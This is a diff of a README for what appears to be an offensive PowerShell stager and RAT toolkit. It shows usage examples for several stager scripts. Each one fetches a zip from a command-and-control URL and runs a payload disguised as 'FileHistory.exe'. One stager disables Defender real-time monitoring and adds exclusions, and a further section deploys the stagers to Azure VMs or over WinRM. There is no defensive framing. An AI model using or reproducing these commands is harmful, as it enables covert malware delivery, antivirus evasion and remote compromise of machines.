@@ -24,16 +24,34 @@ $url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 
-.\simplestager.ps1 -url $url -zipName $zipName -exeName $exeName
+.\simpleStager.ps1 -url $url -zipName $zipName -exeName $exeName
+```
+
+##### systemStager - Running as SYSTEm/Admin Drops to AppData, random zipname, disables real-time monitoring and sets exclusions
+```powershell
+$url = "https://c2.serverless.com/api/assets/fhZip"
+$exeName = "FileHistory.exe"
+
+.\systemStager.ps1 -url $url -exeName $exeName
 ```
 
 ##### Stager.ps1 - Admin checks for install paths and optionally defender exlucsions/disabling
+
 ```powershell
 $url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 
 .\Stager.ps1 -url $url -zipName $zipName -exeName $exeName
+```
+
+##### noparamStager.ps1 - Set the params as vars in the script to make remote execution easier
+```powershell
+$url = "https://c2.serverless.com/api/assets/fhZip"
+$zipName = "fh.zip"
+$exeName = "FileHistory.exe"
+
+.\noParamStager.ps1 -url $url -zipName $zipName -exeName $exeName
 ```
 
 ##### azSadrat.ps1 - Run a Stager on Azure VM or over PS-Session 
@@ -49,7 +67,7 @@ $scriptPath = ".\Stager.ps1"
 .\azSadrat.ps1 -az -url $url -zipName $zipName -exeName $exeName -vmName $vmName -resourceGroup $rg -scriptPath $scriptPath
 
 # winRm
-$Ip = '52.170.147.27'
+$Ip = ''
 .\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName $exeName -vmName $Ip -scriptPath $scriptPath
 
 ```
